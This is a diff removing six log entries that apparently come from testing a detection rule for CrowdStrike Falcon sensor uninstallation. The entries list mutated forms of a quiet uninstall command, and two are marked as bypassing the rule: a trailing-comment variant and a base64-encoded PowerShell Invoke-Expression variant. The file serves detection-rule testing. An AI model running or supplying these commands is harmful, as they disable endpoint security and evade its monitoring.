@@ -1,6 +1,0 @@
-{"timestamp": "2025-06-23 17:40:15 UTC", "rule": "proc_creation_win_uninstall_crowdstrike_falcon_0", "phase": "original", "command": "\\WindowsSensor.exe /uninstall /quiet", "status": "DETECTED"}
-{"timestamp": "2025-06-23 17:40:24 UTC", "rule": "proc_creation_win_uninstall_crowdstrike_falcon_0", "phase": "insertion", "command": "\\WindowsSensor.exe /uninstall /\"q\"\"u\"\"i\"\"e\"\"t\"", "status": "DETECTED"}
-{"timestamp": "2025-06-23 17:40:30 UTC", "rule": "proc_creation_win_uninstall_crowdstrike_falcon_0", "phase": "substitution", "command": "\\WindowsSensor.exe /uninstall /quiet #substitution", "status": "BYPASSED"}
-{"timestamp": "2025-06-23 17:40:36 UTC", "rule": "proc_creation_win_uninstall_crowdstrike_falcon_0", "phase": "omission", "command": "\\WindowsSensor /uninstall /quiet", "status": "DETECTED"}
-{"timestamp": "2025-06-23 17:40:42 UTC", "rule": "proc_creation_win_uninstall_crowdstrike_falcon_0", "phase": "reordering", "command": "\\WindowsSensor.exe /uninstall /quiet", "status": "DETECTED"}
-{"timestamp": "2025-06-23 17:40:49 UTC", "rule": "proc_creation_win_uninstall_crowdstrike_falcon_0", "phase": "recoding", "command": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('XFdpbmRvd3NTZW5zb3IuZXhlIC91bmluc3RhbGwgL3F1aWV0')) | Invoke-Expression\" ", "status": "BYPASSED"}
